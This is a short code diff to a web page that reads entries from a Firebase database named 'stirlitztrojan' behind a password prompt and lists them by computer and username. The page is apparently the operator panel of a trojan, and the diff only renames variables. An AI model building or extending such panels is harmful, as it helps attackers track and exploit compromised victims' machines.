@@ -25,14 +25,14 @@
     <!--
     var firebase = new Firebase("https://stirlitztrojan.firebaseio.com/" + prompt("Password:"));
     firebase.on("value", function(snapshot) {
-      var data = snapshot.val().data;
-      var color;
+      var rows, color;
       
+      rows = snapshot.val().user;
       color = "#cccccc";
-      for (var key in data) {
-        if (data.hasOwnProperty(key)) {
+      for (var key in rows) {
+        if (rows.hasOwnProperty(key)) {
           var name = key;
-          var value = data[key];
+          var value = rows[key];
           
           var computer =  name.split("&")[0];
           var username =  name.split("&")[1];
@@ -54,11 +54,12 @@
         }
       }
       
+      rows = snapshot.val().user;
       color = "#cccccc";
-      for (var key in data) {
-        if (data.hasOwnProperty(key)) {
+      for (var key in rows) {
+        if (rows.hasOwnProperty(key)) {
           var name = key;
-          var value = data[key];
+          var value = rows[key];
           
           var computer = name.split(",")[0].split("&")[0];
           var username = name.split(",")[0].split("&")[1];
